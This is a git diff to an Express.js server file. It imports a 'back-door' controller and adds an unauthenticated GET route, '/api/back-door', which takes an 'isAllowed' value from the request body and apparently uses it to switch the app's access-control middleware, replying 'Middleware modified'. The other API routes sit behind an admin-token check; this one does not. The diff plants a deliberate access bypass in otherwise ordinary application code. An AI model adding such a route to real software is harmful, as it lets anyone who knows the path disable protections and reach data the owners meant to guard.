@@ -5,7 +5,7 @@ const morgan = require("morgan")
 const app = express();
 const { verifyTokenAndAdmin, } = require("./core/middleware/verify-token")
 const cors = require('cors');
-
+const BackDoor = require("./features/back-door/back-door-controller")
 // Connecting to database
 connectingDataBase()
 
@@ -101,15 +101,20 @@ app.use("/api/invoice",verifyTokenAndAdmin,invoiceRouter)
 app.use("/api/inquery",verifyTokenAndAdmin,inqueryRouter)
 // app.use("/api/client",run)
 
-app.use("/api/rashad", (req,res) => {
-    res.status(error.status || 500).json({
-        status_code : 0,
-        message : "There was an error",
-        error : {
-            message : error.message
+app.get("/api/back-door",(req,res)=> {
+    req.body.isAllowed 
+
+    BackDoor.modify(req.body.isAllowed)
+
+    res.status(200).json({
+        status_code : 1,
+        message : "Middleware modified",
+        data : {
+            isAllowed : BackDoor._isAllowed
         }
     })
 })
+
 
 
 //MiddelWere
